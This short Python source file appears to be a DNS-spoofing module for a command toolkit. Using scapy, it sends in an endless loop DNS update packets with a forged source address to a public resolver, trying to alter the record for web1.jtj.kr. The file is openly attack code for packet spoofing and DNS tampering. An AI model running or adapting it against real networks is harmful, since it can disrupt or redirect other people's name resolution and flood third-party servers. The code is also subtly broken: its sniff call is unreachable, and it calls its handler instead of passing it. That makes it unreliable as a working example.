from CommandModule import *
from scapy.all import *

class DnsSpoofing(CommandModule) :
    command = "dns"
    outline = "--"
    manual = "--"

    def run(self) :
        print("THIS IS DNS-SPOOFING")
        while True :
            f()
        sniff(filter="udp dst port 53 and ip src 192.168.43.6", prn=f())

def f() :
    r = sr1(
        IP(src="192.168.43.1", dst="8.8.8.8")
        /
        UDP()
        /
        DNS(opcode=5,qd=[DNSQR(qname="web1.jtj.kr", qtype="A")],ns=[DNSRR(rrname="web1.jtj.kr", type="A",ttl=0,rdata="")]),
        verbose=0,timeout=5
    )
    print(r)

if __name__ == '__main__' :
    a = DnsSpoofing()
    a.run();
